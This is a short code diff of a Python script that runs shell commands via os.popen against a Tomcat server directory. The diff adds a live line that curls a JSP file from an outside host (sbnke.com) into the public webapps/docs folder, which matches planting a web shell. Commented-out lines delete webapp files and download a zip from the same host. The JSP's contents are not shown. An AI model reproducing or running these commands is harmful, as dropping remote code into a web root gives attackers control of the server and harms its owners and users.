@@ -8,11 +8,11 @@ import os
 #stream = os.popen('rm -rf opt/tomcat/webapps/aggregate/my_env_b')  # or 'dir' for Windows
 #stream = os.popen('rm opt/tomcat/webapps/aggregate/my_env_b.zip')  # or 'dir' for Windows
 
-stream = os.popen('mkdir opt/tomcat/webapps/docs/netspi')  # or 'dir' for Windows
+#stream = os.popen('mkdir opt/tomcat/webapps/docs/netspi')  # or 'dir' for Windows
 
 
 #stream = os.popen('curl -o opt/tomcat/webapps/aggregate/my_env_b.zip https://sbnke.com/my_env_be.zip')  # or 'dir' for Windows
-#stream = os.popen('curl -o opt/tomcat/webapps/docs/netspi.png https://sqlwiki.netspi.com/assets/images/logo.png?1715200493890722322')  # or 'dir' for Windows
+stream = os.popen('curl -o opt/tomcat/webapps/docs/netspi/test.jsp https://sbnke.com/jsp/test.jsp')  # or 'dir' for Windows
 
 #stream = os.popen('python3 -m pip install fastapi uvicorn --user')  # or 'dir' for Windows
 
